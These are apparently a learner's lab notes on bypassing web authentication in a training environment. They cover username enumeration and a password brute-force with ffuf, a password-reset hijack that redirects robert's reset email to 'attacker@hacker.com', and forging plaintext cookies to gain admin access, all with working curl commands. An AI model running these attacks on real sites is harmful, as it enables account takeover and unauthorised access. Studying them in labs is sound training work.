
- One of the key tasks of pentesting is bypassing or breaking website authentication methods.

**Username Enumeration**

- As per the name, this process involves creating a valid list of usernames built through collating website error messages.
- Ex: we enter the username `admin`, and we get an error `An account with this username already exists`.

![[Pasted image 20230224204306.png]]
- We can use the existence of this error message to produce a list of valid usernames already signed up on the system.

- Can use FFuF here, which uses a list of commonly used usernames to check for matches.

Check out the rest of the method here: [[FFuF]]

Once we got our username list that we made putting the usernames we got from FFuF, we can perform a brute force attack against the same login directory.

`ffuf -w <usernamelist.txt>:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.47.53/customers/login -fc 200`

When you run this, make sure you are in the same directory as <usernamelist.txt>

Here, the
	- `w1` keyword represents the list of valid usernames, which we have assigned to <usernamelist.txt>.
	- `w2` keyword represents the list of passwords we will try, which is assigned to **10-million-password-list-top-100.txt**.
	- `-fc` argument is used to check for HTTP status codes other than 200. Filters out HTTP status codes.

Result:
![[Pasted image 20230224205546.png]]

Now, we know that a valid username is **steve** (W1), while its corresponding password is **thunder** (W2).


***Abusing Logic Flaws***

- It is not uncommon for authentication processes to contain logic flaws.
	-  can exist in any area of website.

Ex:![[Pasted image 20230224210253.png]]

- This code checks to see whether the start of the path the client is visiting begins with /admin.
		- If so, the code checks to see whether the client is an admin.
		- If the page doesn't begin with /admin, the page is displayed to the client.

- This is php sample code, and its looking for an exact match on the string 'admin'. 
		- This means that there is a logic flaw because an unauthenticated user requesting the `/adMin` will not have their privileges checked- the page will be displayed to them, bypassing the authentication checks.


![[Pasted image 20230224214044.png]]
In the presented scenario, we are able to login to an IT Support page using an email robert@acmeitsupport.thm, and a username **robert**.

- The username is submitted in a POST field to the web server, and the email is sent in the query string request as a GET field.

GET:

![[Pasted image 20230224214301.png]]

POST:
![[Pasted image 20230224214315.png]]

This information was found out using the **Network Debugger Panel** (F12).

We can also illustrate this through the use of `curl`:

![[Pasted image 20230224214546.png]]

![[Pasted image 20230224214558.png]]


- If a PHP array variable such as `$_REQUEST` contains the data received from the query string and POST data of the resonding server, the application logic for the variable may favor POST data rather than the query string.
- AKA, POSTS (or alternations of data) will be prioritized.
		- In this case, we could add another parameter to the POST form, and then can control where the password reset email gets delivered.

Ex:

`curl 'http://10.10.47.53/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`

![[Pasted image 20230224214959.png]]

As you can see here, the POST that is returned has redirected where the mail is sent to `attacker@hacker.com`, as we specified in the `-d` argument above.

- Of course, in a real example, we would make an account on the page, and input the email address we received as a result, such as ethereal@customer.acmeitsupport.thm

![[Pasted image 20230224220105.png]]
Ex:`'http://10.10.47.53/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=ethereal@customer.acmeitsupport.thm'`

Running this command will have a ticket created on our account with a link to log us in as Robert.

![[Pasted image 20230224215534.png]]

![[Pasted image 20230224215556.png]]

After following that link, we find ourselves on Roberts account, from where we are able to view their support tickets, and even reset their password.

![[Pasted image 20230224215835.png]]
![[Pasted image 20230224215848.png]]

Change Roberts password:

![[Pasted image 20230224220225.png]]

Thus, we have gotten full control of their account from incorrectly delegated PHP variables. 

***Messing Wit Da Cookies***

- Another way we can bypass traditional authentication mechanisms is to examine anad edit cookies set by the web server during the online session.
	- Can allow us access to another user's account, unauthenticated access, or elevated privileges.

- Sometimes, contents of cookies is in plaintext, which makes it obvious to see what certain parameters do.

Ex: `Set-Cookie: loggin_in=true; Max-Age=3600;Path=/`
`Set-Cookie: admin=false; Max-Age=3600; Path=/` 

The first cookie appears to control whether the user is currently logged in, while the second controls whether the user has admin privileges.


- In theory, if we are able to simply change the contents of cookies such as thesen and then make another login request we would be able to change our privileges.

**Scenario: Exploiting a page that does not properly encode cookies**

- Run recon curl: `curl http:10.10.47.53/cookie-test`
![[Pasted image 20230224222141.png]]

- Using **Inspector** also shows us the following information about the Cookie data that is sent simply upon us accessing the cookie-test webpage:
![[Pasted image 20230224222445.png]]

What if we were to change the cookie fields to something like:
	- `admin=true`
	-` logged_in=true`

Lets try this with curl:

`curl -H "Cookie: logged_in=true; admin=false" https://10.10.47.53/cookie-test`

![[Pasted image 20230224222641.png]]

Now we're getting somewhere.

Lets try forging the cookie to loggin as an admin:

`curl -H "Cookie: logged_in=true; admin=true" https://10.10.47.53/cookie-test`

![[Pasted image 20230224222832.png]]

Now we are logged in as an admin where we would presumably have access to sensitive information!

**Protecting Cookies**

- Cookie values are often times hashed, which in this case produces an irreversible representation of the original text.
![[Pasted image 20230224223012.png]]
Can still be cracked with something like https://crackstation.net/

- Cookie are also oftentimes encoded, using encodings such as base32 or base64.
	- In this case, the encoding is reversible, and we can easily obtain the original cookie value.

Ex: 
`Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/**`

Here, the encoded value translates to {"id":1,"admin":false}

Use https://gchq.github.io/CyberChef/ when dealing with encoding/decoding.